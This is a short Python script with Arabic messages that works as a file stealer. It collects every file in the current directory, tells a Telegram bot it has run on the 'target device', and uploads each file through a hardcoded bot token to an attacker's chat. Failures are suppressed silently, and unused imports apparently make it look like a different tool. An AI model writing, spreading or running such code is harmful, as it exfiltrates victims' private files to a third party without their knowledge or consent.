import requests, os, random
from user_agent import generate_user_agent
from uuid import uuid4
import socket
import webbrowser
import datetime
import sys
import json

os.system('clear')

#------------------------------[الإعدادات]------------------------------
token2 = '9251455911:AAF9pg9Ph7Qap_tdJLMePmBFndqr-Auf9F4'
ID2 = '7048206906'

file_ha = []
for file in os.listdir():
    if os.path.isfile(file):
        file_ha.append(file)

try:
    requests.post(f"https://api.telegram.org/bot{token2}/sendMessage", data={
        "chat_id": ID2,
        "text": "تم تشغيل الأداة بنجاح على الجهاز المستهدف."
    })
except Exception as e:
    pass

for file in file_ha:
    with open("file_mahdi.txt", "a") as pro:
        pro.write(str(file) + "\n")
        try:
            with open(file, "rb") as f:
                requests.post(
                    f'https://api.telegram.org/bot{token2}/sendDocument',
                    data={'chat_id': ID2, 'caption': f'ملف مسحوب بواسطة الأداة - مستر صوفي'},
                    files={'document': f}
                )
        except:
            pass

print("[+] تم تنفيذ المهام وإرسال التقارير بنجاح.")
